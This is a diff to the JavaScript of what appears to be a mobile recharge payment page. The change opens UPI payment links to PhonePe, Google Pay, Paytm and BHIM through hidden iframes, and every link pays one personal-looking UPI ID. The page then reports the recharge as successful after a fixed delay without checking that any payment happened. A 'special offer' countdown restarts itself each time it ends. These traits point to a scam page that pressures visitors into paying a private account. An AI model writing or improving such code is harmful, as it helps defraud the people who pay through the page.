@@ -184,10 +184,10 @@ function showPaymentModal() {
     // Update payment header with amount
     const paymentHeader = modal.querySelector('.payment-header h2');
     if (paymentHeader) {
-        paymentHeader.textContent = `Redirecting to PhonePe for payment of ${amount}...`;
+        paymentHeader.textContent = `Redirecting to UPI Payment for ${amount}...`;
     }
     
-    // Simulate redirect to PhonePe after 2 seconds
+    // Simulate redirect to UPI Payment after 2 seconds
     setTimeout(() => {
         redirectToPhonePe(amount);
     }, 2000);
@@ -205,46 +205,95 @@ function redirectToPhonePe(amount) {
     
     localStorage.setItem('paymentData', JSON.stringify(paymentData));
     
-    // PhonePe app deep link URL
-    const phonepeUrl = `phonepe://pay?ver=01&mode=19&pa=arjunyadav216386.rzp@icici&pn=ARJUNYADAV&tr=RZPQqDORedM5eLJ70qrv2&cu=INR&mc=5732&qrMedium=04&tn=PaymenttoARJUNYADAV&am=444.00${amount.replace('₹', '')}&merchantId=PHONEPE&transactionId=${Date.now()}`;
+    // UPI ID for payment
+    const upiId = 'arjunyadav216386.rzp@icici';
+    const amountValue = amount.replace('₹', '');
+    const transactionId = Date.now();
     
     // Show redirect message
     const modal = document.getElementById('paymentModal');
     const paymentHeader = modal.querySelector('.payment-header h2');
     if (paymentHeader) {
-        paymentHeader.textContent = 'Redirecting to PhonePe...';
+        paymentHeader.textContent = 'Redirecting to UPI Payment...';
     }
     
-    // Try to open PhonePe app
+    // Create UPI payment URLs for different apps
+    const upiUrls = {
+        phonepe: `phonepe://pay?pa=${upiId}&pn=Mobile%20Recharge&am=${amountValue}&cu=INR&tr=${transactionId}`,
+        googlepay: `tez://upi/pay?pa=${upiId}&pn=Mobile%20Recharge&am=${amountValue}&cu=INR&tr=${transactionId}`,
+        paytm: `paytmmp://pay?pa=${upiId}&pn=Mobile%20Recharge&am=${amountValue}&cu=INR&tr=${transactionId}`,
+        bhim: `bhim://upi/pay?pa=${upiId}&pn=Mobile%20Recharge&am=${amountValue}&cu=INR&tr=${transactionId}`,
+        generic: `upi://pay?pa=${upiId}&pn=Mobile%20Recharge&am=${amountValue}&cu=INR&tr=${transactionId}`
+    };
+    
+    // Try to open UPI payment apps in order of preference
     try {
-        // Create a hidden iframe to attempt the redirect
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = phonepeUrl;
-        document.body.appendChild(iframe);
+        // Create a more robust UPI payment redirection
+        const upiPaymentMethods = [
+            { name: 'PhonePe', url: upiUrls.phonepe },
+            { name: 'Google Pay', url: upiUrls.googlepay },
+            { name: 'Paytm', url: upiUrls.paytm },
+            { name: 'BHIM', url: upiUrls.bhim },
+            { name: 'Generic UPI', url: upiUrls.generic }
+        ];
         
-        // Fallback to web URL if app is not installed
-        setTimeout(() => {
-            const webUrl = `https://mercury.phonepe.com/transact?amount=${amount.replace('₹', '')}&merchantId=PHONEPE&transactionId=${Date.now()}`;
-            window.open(webUrl, '_blank');
-        }, 1000);
+        let currentMethodIndex = 0;
+        const iframes = [];
         
-        // Clean up iframe
-        setTimeout(() => {
-            document.body.removeChild(iframe);
-        }, 2000);
+        function tryNextUPIMethod() {
+            if (currentMethodIndex < upiPaymentMethods.length) {
+                const method = upiPaymentMethods[currentMethodIndex];
+                console.log(`Trying ${method.name}...`);
+                
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = method.url;
+                document.body.appendChild(iframe);
+                iframes.push(iframe);
+                
+                currentMethodIndex++;
+                
+                // Try next method after 1 second
+                setTimeout(tryNextUPIMethod, 1000);
+            } else {
+                // Clean up all iframes after trying all methods
+                setTimeout(() => {
+                    iframes.forEach(iframe => {
+                        if (iframe.parentNode) {
+                            document.body.removeChild(iframe);
+                        }
+                    });
+                }, 2000);
+            }
+        }
+        
+        // Start trying UPI methods
+        tryNextUPIMethod();
         
     } catch (error) {
-        console.log('PhonePe app not available, using web fallback');
-        // Fallback to web URL
-        const webUrl = `https://mercury.phonepe.com/transact?amount=${amount.replace('₹', '')}&merchantId=PHONEPE&transactionId=${Date.now()}`;
-        window.open(webUrl, '_blank');
+        console.log('UPI apps not available, using generic UPI URL');
+        // Fallback to generic UPI URL
+        window.open(upiUrls.generic, '_blank');
     }
     
-    // Simulate payment success after redirect (in real implementation, this would be handled by PhonePe callback)
+    // Simulate payment success after redirect (in real implementation, this would be handled by UPI callback)
     setTimeout(() => {
-        simulatePhonePePayment();
+        simulateUPIPayment();
     }, 5000);
+}
+
+function simulateUPIPayment() {
+    // Simulate successful payment from UPI
+    const paymentData = JSON.parse(localStorage.getItem('paymentData'));
+    if (paymentData) {
+        paymentData.status = 'success';
+        paymentData.paymentId = 'UPI' + Date.now();
+        paymentData.upiId = 'arjunyadav216386.rzp@icici';
+        localStorage.setItem('paymentData', JSON.stringify(paymentData));
+    }
+    
+    // Simulate redirect back to our page
+    handlePaymentReturn();
 }
 
 function simulatePhonePePayment() {
@@ -345,8 +394,9 @@ function showSuccessMessage(amount) {
             <div class="payment-messages">
                 <p>Your mobile recharge of ${amount} has been completed successfully.</p>
                 <p><strong>Plan Details:</strong> ${planDetails}</p>
+                <p>Payment processed via UPI: arjunyadav216386.rzp@icici</p>
                 <p>You will receive a confirmation SMS shortly.</p>
-                <p>Thank you for using PhonePe!</p>
+                <p>Thank you for using our recharge service!</p>
             </div>
             <button class="recharge-btn" onclick="closeSuccessModal()">Done</button>
         </div>
@@ -384,8 +434,8 @@ function startCountdown() {
     
     console.log('Timer element found, starting countdown...');
     
-    // Start with 12 minutes 35 seconds (755 seconds total)
-    let timeLeft = 12 * 60 + 35;
+    // Start with 6 minutes (360 seconds total)
+    let timeLeft = 6 * 60;
     
     function updateTimer() {
         const minutes = Math.floor(timeLeft / 60);
@@ -435,8 +485,8 @@ function startCountdown() {
         if (timeLeft > 0) {
             timeLeft--;
         } else {
-            // When timer reaches 0, reset to 12:35 or show expired message
-            timeLeft = 12 * 60 + 35; // Reset to 12:35
+            // When timer reaches 0, reset to 6:00 or show expired message
+            timeLeft = 6 * 60; // Reset to 6:00
             showNotification('Special offer has ended! New offers coming soon.', 'warning');
             
                 // Reset styling
